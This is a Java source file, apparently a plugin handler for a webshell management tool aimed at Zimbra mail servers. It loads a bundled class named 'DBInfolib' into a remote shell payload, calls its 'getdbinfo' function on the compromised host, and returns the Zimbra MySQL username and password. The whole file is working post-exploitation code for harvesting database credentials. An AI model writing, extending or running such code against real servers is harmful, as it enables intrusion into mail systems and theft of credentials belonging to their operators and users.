/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import core.Encoding;
import core.imp.Payload;
import shells.plugins.java.ZimbraPlugin;
import util.functions;
import util.http.Parameter;
import util.http.ReqParameter;

import java.util.HashMap;
import java.util.Properties;

/**
 * @author Administrator
 */
public class DBInfo extends HandlerBase {

    public String handler() {
        String returnstr = "jdbc:mysql://127.0.0.1:7306/zimbra, UserName=zimbra , password=";
        this.payload.include("Dbinfo", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/DBInfolib.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("asdasd", "asdsad");
//        String password = encoding.Decoding(payload.evalFunc("Dbinfo", "getdbinfo", reqParameter));
        Parameter properties = Parameter.deserialize(payload.evalFunc("Dbinfo", "getdbinfo", reqParameter));
        String password = properties.getParameterString("password");
        String user = properties.getParameterString("user");
        returnstr = returnstr + "UserName="+user+" , password=" + password;
        return returnstr;

    }

}
